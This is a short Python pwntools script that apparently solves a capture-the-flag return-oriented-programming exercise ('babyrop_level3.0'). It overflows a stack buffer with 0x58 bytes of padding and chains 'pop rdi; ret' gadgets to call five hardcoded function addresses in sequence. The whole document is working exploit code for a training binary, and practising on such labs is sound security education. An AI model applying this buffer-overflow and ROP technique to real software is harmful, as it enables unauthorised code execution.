from pwn import *

context.arch="amd64"
p = process("/challenge/babyrop_level3.0")

def get_rop_byte(addrs:list, pop):
    bytes = b""
    g = 1
    for i in addrs:
        bytes += pop.to_bytes(8,"little") + g.to_bytes(8,"little") + i.to_bytes(8,"little")
        g+=1
    return bytes
elf = ELF("/challenge/babyrop_level3.0")
rop = ROP(elf)
addr = rop.find_gadget(['pop rdi', 'ret'])[0]

l = [0x402243, 0x402081, 0x402161, 0x40231F, 0x401F9E]
p.send(b"A"*0x58 + get_rop_byte(l, addr))
all = p.recvall()
print(all.decode())